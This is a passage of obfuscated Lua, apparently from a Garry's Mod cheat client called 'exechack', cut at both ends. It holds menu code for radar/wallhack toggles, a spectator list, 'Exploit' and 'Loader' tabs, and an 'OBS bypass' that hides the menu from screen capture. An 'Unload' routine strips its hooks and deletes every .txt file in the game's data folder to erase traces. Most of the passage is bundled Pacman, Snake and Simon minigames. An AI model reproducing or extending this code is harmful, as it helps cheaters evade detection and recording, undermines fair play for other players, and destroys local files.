tableselect:Remove()end;tableselect=vgui.Create("DPanel",dq)tableselect:SetPos(3,52)tableselect:SetSize(494,245)tableselect.Paint=function(a8,a9,aa)end;aI("Menu Key",3,0,tableselect)aE("Key","MENU_OPENKEY",3,15,0,tableselect)aI("Add Entity/Player Key",4,40,tableselect)aE("Key","MISC_ADDENTITYFRIEND",3,55,0,tableselect)aI("Panic Key",3,80,tableselect)aE("Key","PANICKEY",3,95,0,tableselect)au("OBS bypass","OBSBYPASS",3,121,tableselect,"Hide all DFrame",nil,true)au("Cloud Radar","CLOUDRADAR",3,138,tableselect,"Supports: rp_bangclaw, rp_downtown_tits_v1")a2("",135,139,15,15,tableselect,function()notifications("Link copied")SetClipboardText("https://exechack.cc/forum/radar.php?user="..username or'')end)a2("No".."tification",3,156,90,25,tableselect,function()ab(200,36+17-15,function()au("You killed/damaged","NOIFICATION_DAMAGEDMEBY",3,2,doplpanel)au("Friend damaged/killed","NOIFICATION_FRIENDDAMAGED",3,2+17,doplpanel)end)end)a2("Unload",3,156+27,55,25,tableselect,function()z("WH_INFO",false)z("WH_RADAR",false)z("MISC_SPECTATORLIST",false)z("OBSBYPASS",false)timer.Simple(2,function()if IsInGame()then local dz=""for h,m in pairs({"PostDrawOpaqueRenderables","RenderScreenspaceEffects","PreDrawOpaqueRenderables","Move","ShutDown","CalcView","CreateMove","Think","PreDrawEffects","PostDrawViewModel","HUDPaint","player_changename","player_connect","player_disconnect","player_say","player_hurt","entity_killed","OnEntityCreated","RenderScene","PostDraw2DSkyBox"})do dz=dz.."hook.Remove('"..m.."','"..b.randomforhook.."')"end;p(dz)end;timer.Simple(3,function()hide()timer.Remove("check")hook.Remove("Think","fff")hook.Remove("bitch","1")for h,m in pairs(file.Find("*.txt","DATA"))do file.Delete(m)end end)end)end)end)dq:Hide()local dA=3;local function dB(K,a0,aq,derma)local a7=vgui.Create("DButton",menulist)a7:SetFont("hack_font_18")a7:SetText(K)a7:SetTextColor(b.colortext)a7:SetSize(a0,25)a7:SetPos(dA,3)a7.Paint=function(a8,a9,aa)draw.RoundedBox(0,0,0,a9,aa,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aa)if a7.Hovered or a1[aq]then draw.RoundedBox(0,0,0,a9,aa,b.buttonhovered)end end;a7.DoClick=function()a1[aq]=not a1[aq]if a1[aq]then derma:Show()derma:MoveToFront()else derma:Hide()end end;dA=dA+2+a0 end;local function dC(K,a0,aq,A)local a7=vgui.Create("DButton",menulist)a7:SetFont("hack_font_18")a7:SetText(K)a7:SetTextColor(b.colortext)a7:SetSize(a0,25)a7:SetPos(dA,3)a7.Paint=function(a8,a9,aa)draw.RoundedBox(0,0,0,a9,aa,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aa)if a7.Hovered then draw.RoundedBox(0,0,0,a9,aa,b.buttonhovered)end;if t[aq]then draw.RoundedBox(0,0,0,a9,aa,b.buttonhovered)end end;a7.DoClick=function()z(aq,not t[aq])end;if A then a7.DoRightClick=A end;dA=dA+2+a0 end;local function dD(K,A,a0)a2(K,dA,3,a0,25,menulist,A)dA=dA+2+a0 end;menulist=vgui.Create("DFrame")menulist:SetSize(ScrW(),31)menulist:SetPos(0,0)menulist:SetTitle("")menulist:MakePopup()menulist:SetDraggable(false)menulist:ShowCloseButton(false)menulist.Paint=function(a8,a9,aa)draw.RoundedBox(0,0,0,a9,aa,b.menubarbg)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aa)end;dB("Spam",46,"spam",cP)dB("Logs",40,"logs",cF)dB("Target",48+4,"itemlist",cZ)dB("Loader",48+6,"glualoder",di)dB("Exploit",48+6,"exploit",cW)dC("Info",32,"WH_INFO")dC("Radar",56-12,"WH_RADAR",function()ab(150,32+17,function()an(doplpanel,1,200,"WH_RADAR_DISTANCE",-101,-3,250,"Distance")an(doplpanel,1,7,"WH_RADAR_SIZE",-101,11,250,"Size")au("Show Names","RDRSNA",3,30,doplpanel,"Show player's name on radar")end)end)dC("Spectators list",104,"MISC_SPECTATORLIST")dD("Games",function()ab(100,85+27,function()a2("Pacman",3,3,60,25,doplpanel,function()steamworks.Subscribe("177212166")steamworks.ApplyAddons()PANEL={}surface.CreateFont("FONT",{font="akbar",size=30,weight=100,blursize=0,scanlines=0,antialias=true,underline=false,italic=false,strikeout=false,symbol=false,rotary=false,shadow=true,additive=false,outline=true})surface.CreateFont("CounterFont",{font="akbar",size=ScrH()/6,weight=500,blursize=0,scanlines=0,antialias=true,underline=false,italic=false,strikeout=false,symbol=false,rotary=false,shadow=true,additive=false,outline=true})function PANEL:Init()self.panel=vgui.Create("DPanel",self)function self.panel:Paint()end;self.Button={}self.Button[1]=vgui.Create("DImageButton",self)self.Button[1].DoClick=function(self)self.Parent:PressedFirstButton()end;self.Button[2]=vgui.Create("DImageButton",self)self.Button[2].DoClick=function(self)self.Parent:PressedSecondButton()end;self.Button[1].Parent=self;self.Button[2].Parent=self;self.Counter=9;self.delay=CurTime()+1 end;function PANEL:Paintbackground()end;function PANEL:PressedFirstButton()end;function PANEL:PressedSecondButton()end;function PANEL:Paint(a,R)if self.Counter>=4 then draw.SimpleText(" "..self.Counter.." ","CounterFont",a/2,R/2,Color(255,200,0,255),TEXT_ALIGN_CENTER)else draw.SimpleText(" "..self.Counter.." ","CounterFont",a/2,R/2,Color(255,0,0,255),TEXT_ALIGN_CENTER)end end;function PANEL:PaintOver(a,R)end;function PANEL:PerformLayout(a,R)self.Button[1]:SetPos(0,R/2)self.Button[1]:SetSize(a/4,R/2-5)self.Button[1]:SetImage("pacman/menu/continue.png")self.Button[2]:SetPos(a-a/4+6,R/2)self.Button[2]:SetSize(a/4,R/2-5)self.Button[2]:SetImage("pacman/menu/exit.png")end;function PANEL:Close()self:Remove()end;function PANEL:Think()if CurTime()>self.delay then self.Counter=self.Counter-1;surface.PlaySound("pacman/counter.wav")self.delay=CurTime()+1 end;if self.Counter<=0 then self:PressedFirstButton()self:Close()end end;derma.DefineControl("AEndMenu","",PANEL,"Panel")local G="C########=########c\n".."|00000000|00000000|\n".."|0<>0<#>0v0<>0<#>0|\n".."|00000000000000000|\n".."|0<>0^0<#=#>0^0<>0|\n".."|0000|000|000|0000|\n".."l==>0l#>0v0<#r0<==r\n".."Bdd>0v0000000v0<ddb\n".."0000000C>0<c0000000\n".."C==>0^0|s00|0^0<==c\n".."ldd>0v0B###b0v0<ddr\n".."|00000000000000000|\n".."|0<c0<#######>0C>0|\n".."|00|00000000000|00|\n".."l>0v0^0<###>0^0v0<r\n".."|0000|0000000|0000|\n".."|0<##d>0<#>0<d##>0|\n".."|00000000000000000|\n".."B#################b"CreateClientConVar("ghdfopksdfglmer",0,false,false)local S={}local e={}local w={{x=2,y=3},{x=18,y=3},{x=2,y=14},{x=18,y=14}}local T=table.Copy(w)local ae=1;local d=200;local df=1;local aP=1;local av=1;local dg=1;local bV=1;local ax=0;local a7={}local a8={}local a9=1;local aa=0;local dh={}local aw=false;local m=false;local a=0;local R=0;local ad=0;local ay=false;local aA=3;local aB=true;local aC=5;local aD=1;local dE=0;local c9={}S["Up"]="up"S["Right"]="right"S["Down"]="down"S["Left"]="left"S["stop"]="stop"e["Up"]="up"e["Right"]="right"e["Down"]="down"e["Left"]="left"local function dF(az,dG,a,R,dH,dI,dJ)surface.SetDrawColor(dH.r,dH.g,dH.b,dH.a)surface.SetMaterial(dI)surface.DrawTexturedRect(az-dJ,dG-dJ,a+dJ*2,R+dJ*2)end;local function dK(aF,aG,aH)table.insert(S,{Pac={dir=aF,pos=aG,tex=aH}})end;local function dL(aF,dp,aG,dn,dk,aH)table.insert(e,{G={id=dk,dir=aF,mode=dp,pos=aG,oldpos=dn,tex=aH}})end;local function x()aA=3;ad=0;a9=1;ay=false;table.Empty(a8)for dM,dl in ipairs(c9)do AddDot(dl.x,dl.y)end;T=table.Copy(w)end;local function dN(az,dG)local dO=G;local dP=string.Explode("\n",dO)return string.GetChar(dP[dG],az)end;function AddDot(az,dG)table.insert(a8,{x=math.Round(az/a),y=math.Round(dG/R),tex="pacman/star.png"})end;local function dQ(b5,az,dG)for dM,dl in ipairs(b5)do if dl.x==az and dl.y==dG then return dM end end end;local function h(dk,aH)for dM,dl in ipairs(e)do if dl.G.id==dk then dl.G.tex=aH end end end;local function dR(b5,az,dG,dS)if dQ(b5,az,dG)==nil then return end;if dS=="normal"then table.remove(b5,dQ(b5,az,dG))ad=ad+10 elseif dS=="special"then table.remove(b5,dQ(b5,az,dG))ax=CurTime()+5;for dM=1,4 do SetGhostMode(tostring(dM),"scatter")end elseif dS=="speical bon"then table.remove(b5,dQ(b5,az,dG))ad=ad+25*a9 end;surface.PlaySound("pacman/chomp.wav")end;local function dT(dk,aF)for dM,dl in ipairs(e)do if dl.G.id==dk then dl.G.dir=aF end end end;local function dU()return S[1].Pac.dir end;local function dx(aF)S[1].Pac.dir=aF end;local function dV(dk)for dM,dl in ipairs(e)do if dl.G.id==dk then return dl.G.pos end end end;function SetGhostMode(dk,dp)for dM,dl in ipairs(e)do if dl.G.id==dk then dl.G.mode=dp end end end;local function dW(dk)for dM,dl in ipairs(e)do if dl.G.id==dk then return dl.G.mode end end end;local function dX(dk,aG)for dM,dl in ipairs(e)do if dl.G.id==dk then dl.G.pos=aG end end end;local function dY(dk)for dM,dl in ipairs(e)do if dl.G.id==dk then return dl.G end end end;local function dZ(dk)for dM,dl in ipairs(e)do if dl.G.id==dk then return dl.G.oldpos end end end;local function d_(dk)for dM,dl in ipairs(e)do if dl.G.id==dk then return dl.G.dir end end end;local function e0(aG)S[1].Pac.pos=aG end;local function e1()return S[1].Pac.pos end;local function C(dk,aG)if dk~=nil then local e2,e3=dV(dk).x,dV(dk).y;local e4,e5=aG.x,aG.y;local e6=math.Round(math.deg(math.atan2(e4-e2,e5-e3)))if e6>90 and e6<180 then return{a="up",b="right"}elseif e6==90 then return{a="right",b="right"}elseif e6<90 and e6>0 then return{a="down",b="right"}elseif e6==0 then return{a="down",b="down"}elseif e6<0 and e6>-90 then return{a="down",b="left"}elseif e6==-90 then return{a="left",b="left"}elseif e6<-90 and e6>-180 then return{a="up",b="left"}elseif e6==-180 or e6==180 then return{a="up",b="up"}end else Error("[Royal Arcade Games] function |CheckDirection| first 'arg' a nil value\n")end end;local function e7(aF,dk,e8)if dk==nil then Error("[Royal Arcade Games] function |CanMove| second 'arg' a nil value\n")end;local az,dG=dV(dk).x,dV(dk).y;if aF=="up"then if dN(az,dG-1)=="0"and dG-1~=e8.y then return true else return false end elseif aF=="right"then if dN(az+1,dG)=="0"and az+1~=e8.x then return true else return false end elseif aF=="left"then if dN(az-1,dG)=="0"and az-1~=e8.x then return true else return false end elseif aF=="down"then if dN(az,dG+1)=="0"and dG+1~=e8.y then return true else return false end end end;local function e9()if not ay then local ea=vgui.Create("AEndMenu")ea:SetPos(ScrW()/2-ScrW()/2/2,ScrH()/25*5)ea:SetSize(ScrW()/2,ScrW()/7)function ea:PressedFirstButton()x()self:Close()end;function ea:PressedSecondButton()RunConsoleCommand("ghdfopksdfglmer","0")x()self:Close()end end end;local function eb(dk,aF,ec,e8)if aF==nil then if dN(ec.x+1,ec.y)=="0"and ec.x+1~=e8.x then dT(dk,"right")elseif dN(ec.x-1,ec.y)=="0"and ec.x-1~=e8.x then dT(dk,"left")elseif dN(ec.x,ec.y+1)=="0"and ec.y+1~=e8.y then dT(dk,"down")elseif dN(ec.x,ec.y-1)=="0"and ec.y-1~=e8.y then dT(dk,"up")end else if aF=="up"and ec.y-1~=e8.y then dT(dk,"up")elseif aF=="right"and ec.x+1~=e8.x then dT(dk,"right")elseif aF=="left"and ec.y+1~=e8.y then dT(dk,"left")elseif aF=="down"and ec.x-1~=e8.x then dT(dk,"down")elseif aF=="stop"then dT(dk,"stop")end end end;dL("left","normal",{x=10,y=10},{x=3,y=4},"1","pacman/red.png")dL("left","normal",{x=11,y=10},{x=5,y=18},"2","pacman/blue.png")dL("left","normal",{x=12,y=10},{x=10,y=18},"3","pacman/pinky.png")dL("left","normal",{x=11,y=9},{x=8,y=18},"4","pacman/orange.png")local function ed()if GetConVarNumber("ghdfopksdfglmer")==1 then local dO=G;local ee=string.Explode("\n",dO)local ef=string.ToTable(ee[1])surface.SetDrawColor(0,0,0,255)surface.DrawRect(0,0,ScrW(),ScrH())a,R=math.floor(ScrW()/(#ef-1)),math.floor(ScrH()/#ee)for eg,eh in ipairs(ee)do for dM,dl in ipairs(string.ToTable(eh))do if dl=="0"then if dM*eg<=323 and not aw then table.insert(c9,{x=a*dM-a/2,y=eg*R-R/2,tex="pacman/star.png"})AddDot(a*dM-a/2,eg*R-R/2)table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="walk",id=dM*eg})else aw=true end elseif dl=="#"then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_line.png"})else m=true end elseif dl=="|"then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_stright.png"})else m=true end elseif dl=="l"then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_wall_left.png"})else m=true end elseif dl=="r"then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_wall_right.png"})else m=true end elseif dl=="d"then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_wall_bottom.png"})else m=true end elseif dl=="="then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_middle.png"})else m=true end elseif dl=="<"then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_corn_left.png"})else m=true end elseif dl==">"then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_corn_right.png"})else m=true end elseif dl=="^"then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_corn_top.png"})else m=true end elseif dl=="v"then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_corn_bottom.png"})else m=true end elseif dl=="c"then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_corner_tright.png"})else m=true end elseif dl=="C"then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_corner_tleft.png"})else m=true end elseif dl=="b"then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_corner_bright.png"})else m=true end elseif dl=="B"then if dM*eg<=360 and not m then table.insert(a7,{x=a*dM/a,y=eg*R/R,typ="wall",id=dM*eg,tex="pacman/pacman_corner_bleft.png"})else m=true end elseif dl=="e"then if not table.HasValue(dh,dM)then table.insert(dh,dM)end elseif dl=="s"then if not table.HasValue(dh,dM)then table.insert(dh,dM)dK("left",{x=10,y=14},"pacman/pacclose.png")end end end end;for ei,ej in ipairs(a7)do if ej.typ=="walk"then elseif ej.typ=="wall"then surface.SetDrawColor(0,0,255,255)surface.SetMaterial(Material(ej.tex))surface.DrawTexturedRect(ej.x*a-a,ej.y*R-R,a,R)end end;for dM,dl in ipairs(a8)do surface.SetDrawColor(255,255,255,255)surface.SetMaterial(Material(dl.tex))surface.DrawTexturedRect((dl.x-0.5)*a,(dl.y-0.5)*R,a/4,R/4)end;for dM=1,4 do if CurTime()>ax and dW(tostring(dM))~="killed"then surface.SetDrawColor(255,255,255,255)surface.SetMaterial(Material(e[dM].G.tex))surface.DrawTexturedRect(dV(tostring(dM)).x*a-a,dV(tostring(dM)).y*R-R,a,R)SetGhostMode(tostring(dM),"normal")elseif CurTime()<ax and dW(tostring(dM))=="scatter"then surface.SetDrawColor(255,255,255,255)surface.SetMaterial(Material("pacman/ghostscaredblue1.png"))surface.DrawTexturedRect(dV(tostring(dM)).x*a-a,dV(tostring(dM)).y*R-R,a,R)elseif dW(tostring(dM))=="killed"then surface.SetDrawColor(255,255,255,255)surface.SetMaterial(Material("pacman/ghosteyes.png"))surface.DrawTexturedRect(dV(tostring(dM)).x*a-a,dV(tostring(dM)).y*R-R,a,R)end end;if aB then aC=aC+0.5 elseif not aB then aC=aC-0.5 end;if aC>=10 then aB=false elseif aC<=0 then aB=true end;for dM,dl in ipairs(T)do dF((dl.x-0.5)*a,(dl.y-0.5)*R,a/4,R/4,{r=255,g=255,b=255,a=255},Material("pacman/item.png"),aC)end;surface.SetDrawColor(255,255,0,255)surface.SetMaterial(Material("pacman/pac.png"))surface.DrawTexturedRectRotated(e1().x*a-a/2,e1().y*R-R/2,a,R,aa)draw.SimpleText("Score: "..ad.." ","ChatFont",10,10,Color(255,255,255,255),TEXT_ALIGN_LEFT)draw.SimpleText("Level: "..a9 .." ","ChatFont",10,30,Color(255,255,255,255),TEXT_ALIGN_LEFT)for ek=1,aA do surface.SetDrawColor(255,255,255,255)surface.SetMaterial(Material("pacman/pac.png"))surface.DrawTexturedRect(100+ek*30,25,30,30)end;if CurTime()<dE and aA~=0 then surface.SetDrawColor(255,255,255,math.sin(CurTime()*1.5)*255)surface.SetMaterial(Material("pacman/getready.png"))surface.DrawTexturedRect(a*7.5,R*11,a*4,R)end;if aA==0 then surface.SetDrawColor(255,255,255,255)surface.SetMaterial(Material("pacman/gameover.png"))surface.DrawTexturedRect(a*7.5,R*11,a*4,R)e9()ay=true end;draw.SimpleText("PRESS BACKSPACE TO CLOSE","ChatFont",10,55,Color(255,255,255))end end;hook.Add("DrawOverlay","Pacman",ed)local function el()if not gui.IsGameUIVisible()then RunConsoleCommand("ghdfopksdfglmer","0")end;if input.IsKeyDown(KEY_BACKSPACE)and GetConVarNumber("ghdfopksdfglmer")==1 then RunConsoleCommand("ghdfopksdfglmer","0")end;if GetConVarNumber("ghdfopksdfglmer")==1 and#S>=1 then local em,en=e1().x,e1().y;directionx,directiony=0,0;gdirectionx,gdirectiony=0,0;gdirectionx1,gdirectiony1=0,0;gdirectionx2,gdirectiony2=0,0;gdirectionx3,gdirectiony3=0,0;dR(a8,em,en,"normal")dR(T,em,en,"special")dR(a8,10,9,"normal")dR(a8,10,10,"normal")dR(a8,11,10,"normal")if input.IsKeyDown(KEY_UP)and dN(em,en-1)=="0"and aA~=0 then dx(S["Up"])aa=270 elseif input.IsKeyDown(KEY_DOWN)and dN(em,en+1)=="0"and aA~=0 then dx(S["Down"])aa=90 elseif input.IsKeyDown(KEY_RIGHT)and dN(em+1,en)=="0"and aA~=0 then dx(S["Right"])aa=180 elseif input.IsKeyDown(KEY_LEFT)and dN(em-1,en)=="0"and aA~=0 then dx(S["Left"])aa=0 end;if S[1].Pac.dir==S["Up"]and dN(em,en-1)=="0"then directiony=-1 elseif S[1].Pac.dir==S["Down"]and dN(em,en+1)=="0"then directiony=1 elseif S[1].Pac.dir==S["Right"]and dN(em+1,en)=="0"then directionx=1 elseif S[1].Pac.dir==S["Left"]and dN(em-1,en)=="0"then directionx=-1 elseif S[1].Pac.dir==S["stop"]then directionx=0;directiony=0 end;if d_("1")==S["Up"]and e7(d_("1"),"1",dZ("1"))then gdirectiony=-1 elseif d_("1")==S["Down"]and e7(d_("1"),"1",dZ("1"))then gdirectiony=1 elseif d_("1")==S["Right"]and e7(d_("1"),"1",dZ("1"))then gdirectionx=1 elseif d_("1")==S["Left"]and e7(d_("1"),"1",dZ("1"))then gdirectionx=-1 elseif d_("1")==S["stop"]then gdirectionx=0;gdirectiony=0 end;if d_("2")==S["Up"]and e7(d_("2"),"2",dZ("2"))then gdirectiony1=-1 elseif d_("2")==S["Down"]and e7(d_("2"),"2",dZ("2"))then gdirectiony1=1 elseif d_("2")==S["Right"]and e7(d_("2"),"2",dZ("2"))then gdirectionx1=1 elseif d_("2")==S["Left"]and e7(d_("2"),"2",dZ("2"))then gdirectionx1=-1 elseif d_("2")==S["stop"]then gdirectionx1=0;gdirectiony1=0 end;if d_("3")==S["Up"]and e7(d_("3"),"3",dZ("3"))then gdirectiony2=-1 elseif d_("3")==S["Down"]and e7(d_("3"),"3",dZ("3"))then gdirectiony2=1 elseif d_("3")==S["Right"]and e7(d_("3"),"3",dZ("3"))then gdirectionx2=1 elseif d_("3")==S["Left"]and e7(d_("3"),"3",dZ("3"))then gdirectionx2=-1 elseif d_("3")==S["stop"]then gdirectionx2=0;gdirectiony2=0 end;if d_("4")==S["Up"]and e7(d_("4"),"4",dZ("4"))then gdirectiony3=-1 elseif d_("4")==S["Down"]and e7(d_("4"),"4",dZ("4"))then gdirectiony3=1 elseif d_("4")==S["Right"]and e7(d_("4"),"4",dZ("4"))then gdirectionx3=1 elseif d_("4")==S["Left"]and e7(d_("4"),"4",dZ("4"))then gdirectionx3=-1 elseif d_("4")==S["stop"]then gdirectionx3=0;gdirectiony3=0 end;if CurTime()>df then S[1].Pac.pos.x=S[1].Pac.pos.x+directionx;S[1].Pac.pos.y=S[1].Pac.pos.y+directiony;df=CurTime()+0.15 end;if CurTime()>aP then dY("1").oldpos.x=dY("1").pos.x;dY("1").oldpos.y=dY("1").pos.y;dY("1").pos.x=dY("1").pos.x+gdirectionx;dY("1").pos.y=dY("1").pos.y+gdirectiony;aP=CurTime()+0.20 end;if CurTime()>av then dY("2").oldpos.x=dY("2").pos.x;dY("2").oldpos.y=dY("2").pos.y;dY("2").pos.x=dY("2").pos.x+gdirectionx1;dY("2").pos.y=dY("2").pos.y+gdirectiony1;av=CurTime()+0.25 end;if CurTime()>dg then dY("3").oldpos.x=dY("3").pos.x;dY("3").oldpos.y=dY("3").pos.y;dY("3").pos.x=dY("3").pos.x+gdirectionx2;dY("3").pos.y=dY("3").pos.y+gdirectiony2;dg=CurTime()+0.35 end;if CurTime()>bV then dY("4").oldpos.x=dY("4").pos.x;dY("4").oldpos.y=dY("4").pos.y;dY("4").pos.x=dY("4").pos.x+gdirectionx3;dY("4").pos.y=dY("4").pos.y+gdirectiony3;bV=CurTime()+0.40 end;if dV("1")~=e1()then local eo=C("1",{x=e1().x,y=e1().y})if dW("1")=="killed"then eo=C("1",{x=11,y=8})end;if CurTime()<aD then else if not e7(eo.a,"1",dZ("1"))and not e7(eo.b,"1",dZ("1"))then eb("1",nil,dV("1"),dZ("1"))elseif e7(eo.a,"1",dZ("1"))then eb("1",eo.a,dV("1"),dZ("1"))elseif e7(eo.b,"1",dZ("1"))then eb("1",eo.b,dV("1"),dZ("1"))end end end;if dV("2")~=e1()then local eo=C("2",{x=e1().x,y=e1().y})if dW("2")=="killed"then eo=C("2",{x=11,y=8})end;if CurTime()<aD then else if not e7(eo.a,"2",dZ("2"))and not e7(eo.b,"2",dZ("2"))then eb("2",nil,dV("2"),dZ("2"))elseif e7(eo.a,"2",dZ("2"))then eb("2",eo.a,dV("2"),dZ("2"))elseif e7(eo.b,"2",dZ("2"))then eb("2",eo.b,dV("2"),dZ("2"))end end end;if dV("3")~=e1()then local ep,eq=0,0;if dU()=="up"then ep=0;eq=-2 elseif dU()=="right"then ep=2;eq=0 elseif dU()=="down"then ep=0;eq=2 elseif dU()=="left"then ep=-2;eq=0 elseif dU()=="stop"then ep=2;eq=0 end;local eo=C("3",{x=e1().x+ep,y=e1().y+eq})if dW("3")=="killed"then eo=C("3",{x=11,y=8})end;if CurTime()<aD then else if not e7(eo.a,"3",dZ("3"))and not e7(eo.b,"3",dZ("3"))then eb("3",nil,dV("3"),dZ("3"))elseif e7(eo.a,"3",dZ("3"))then eb("3",eo.a,dV("3"),dZ("3"))elseif e7(eo.b,"3",dZ("3"))then eb("3",eo.b,dV("3"),dZ("3"))end end end;if dV("4")~=e1()then local eo=C("4",{x=e1().x,y=e1().y})if dW("4")=="killed"then eo=C("4",{x=11,y=8})end;if CurTime()<aD then else if not e7(eo.a,"4",dZ("4"))and not e7(eo.b,"4",dZ("4"))then eb("4",nil,dV("4"),dZ("4"))elseif e7(eo.a,"4",dZ("4"))then eb("4",eo.a,dV("4"),dZ("4"))elseif e7(eo.b,"4",dZ("4"))then eb("4",eo.b,dV("4"),dZ("4"))end end end;if CurTime()>ax and ae>1 then ae=1 end;for dM=1,4 do if dV(tostring(dM)).x==e1().x and dV(tostring(dM)).y==e1().y then if dW(tostring(dM))=="scatter"then surface.PlaySound("pacman/pacman_chomp.wav")ad=ad+ae*d;SetGhostMode(tostring(dM),"killed")ae=ae+1 elseif dW(tostring(dM))=="killed"then elseif dW(tostring(dM))~="scatter"or dW(tostring(dM))~="killed"then if CurTime()>aD then aA=aA-1;e0({x=10,y=14})aa=0;S[1].Pac.dir=S["Left"]dE=CurTime()+3;dX("1",{x=9,y=10})dX("2",{x=10,y=10})dX("3",{x=11,y=10})dX("4",{x=10,y=9})dT("1","stop")dT("2","stop")dT("3","stop")dT("4","stop")dx("stop")aD=CurTime()+2 end end end;if aA==0 then dT("1","stop")dT("2","stop")dT("3","stop")dT("4","stop")dx("stop")end end;if aA~=0 and#a8<=0 then table.Empty(a8)for dM,dl in ipairs(c9)do AddDot(dl.x,dl.y)end;T=table.Copy(w)a9=a9+1 end;if e1().x==19 and e1().y==9 and S[1].Pac.dir=="right"then dR(a8,19,9,"normal")dR(a8,1,9,"normal")e0({x=2,y=9})elseif e1().x==1 and e1().y==9 and S[1].Pac.dir=="left"then dR(a8,1,9,"normal")dR(a8,19,9,"normal")e0({x=18,y=9})end;for dM=1,4 do if dV(tostring(dM)).x==10 and dV(tostring(dM)).y==8 and dW(tostring(dM))=="killed"then SetGhostMode(tostring(dM),"normal")end;if dV(tostring(dM)).x==19 and dV(tostring(dM)).y==9 and d_(tostring(dM))=="right"then dX(tostring(dM),{x=2,y=9})elseif dV(tostring(dM)).x==1 and dV(tostring(dM)).y==9 and d_(tostring(dM))=="left"then dX(tostring(dM),{x=18,y=9})end end end end;hook.Add("Think","core",el)RunConsoleCommand("ghdfopksdfglmer",1)end)a2("Snake",3,30,50,25,doplpanel,function()CreateClientConVar("dsfsdfsdfbgfdf",0,false,false)local a=15;local R={headx=ScrW()/2,heady=ScrH()/2,dirx=0,diry=0,length=0,tail={}}local G={x=0,y=0}local S=200;local e=0;local function w()G.x=math.Round(math.random(20,ScrW()-20))G.y=math.Round(math.random(20,ScrH()-ScrH()*0.125))end;w()local function T()if e>0 then print("You died! Final score: "..e.."!")end;S=200;e=0;R={headx=ScrW()/2,heady=ScrH()/2,dirx=0,diry=0,length=0,tail={}}w()end;local function ae()R.length=R.length+a;w()S=math.min(S*1.02,600)e=e+math.Round(S/150)end;local function d()if not gui.IsGameUIVisible()and GetConVarNumber("dsfsdfsdfbgfdf")==1 then RunConsoleCommand("dsfsdfsdfbgfdf","0")end;if input.IsKeyDown(KEY_BACKSPACE)and GetConVarNumber("dsfsdfsdfbgfdf")==1 then RunConsoleCommand("dsfsdfsdfbgfdf","0")end;if GetConVarNumber("dsfsdfsdfbgfdf")==1 then draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(0,0,0))local df,aP,av,dg=input.IsKeyDown(KEY_UP),input.IsKeyDown(KEY_DOWN),input.IsKeyDown(KEY_LEFT),input.IsKeyDown(KEY_RIGHT)if(df or aP)and R.diry==0 then R.diry=df and-1 or 1;R.dirx=0 elseif(av or dg)and R.dirx==0 then R.dirx=av and-1 or 1;R.diry=0 end;table.insert(R.tail,1,{x=R.headx,y=R.heady})if#R.tail>R.length then table.remove(R.tail,#R.tail)end;local bV=R.dirx*S*FrameTime()local ax=R.diry*S*FrameTime()R.headx=R.headx+bV;R.heady=R.heady+ax;if R.headx<=0 or R.heady<=0 or R.heady+a>=ScrH()or R.headx+a>=ScrW()then T()end;if G.x<=R.headx+a and R.headx<=G.x+a and G.y<=R.heady+a and R.heady<=G.y+a then ae()end;local a7=math.abs(math.sin(CurTime()*2.5))surface.SetDrawColor(120+135*a7,50,0,255)surface.DrawRect(G.x,G.y,a,a)surface.SetDrawColor(120+135*a7,50,150*a7,255)for a8=1,#R.tail do local a9=R.tail[a8]if not a9 then break end;surface.DrawRect(a9.x,a9.y,a,a)if a8>a*3 and a9.x>=R.headx and a9.x<=R.headx+a and a9.y>=R.heady and a9.y<=R.heady+a then T()end end;surface.SetDrawColor(50,120+135*a7,150*a7,255)surface.DrawRect(R.headx,R.heady,a,a)surface.SetTextColor(color_white)local aa="Snake score: "..e;surface.SetFont("hack_font_22")local dh,aw=surface.GetTextSize(aa)surface.SetTextPos(10,10)surface.DrawText(aa)draw.SimpleText("PRESS BACKSPACE TO CLOSE","hack_font_22",10,30,Color(255,255,255))end end;hook.Add("DrawOverlay","MenuP_Snake_Draw",d)RunConsoleCommand("dsfsdfsdfbgfdf",1)end)a2("Simon",3,57,50,25,doplpanel,function()local a={}local R={}R[1]=125;R[2]=150;R[3]=175;R[4]=200;local function G()a.Hhfg={}a.jFun={}a.Htij=0;a.Djfyu=false;a.DjfyuSeq=1;a.Whd=1;a.fYbg=nil;a.Wgjyhb=false;a.Egfh=false;a.Rhjd=1 end;local function S()if a.Wgjyhb then return end;if a.Djfyu==false then a.Djfyu=true end;if a.Htij>CurTime()then return end;a.Htij=CurTime()+1;if a.DjfyuSeq==nil then a.DjfyuSeq=1 end;for e,w in pairs(a.Hhfg)do if w.num==a.DjfyuSeq then a.simon_lightUpColor=w.color end 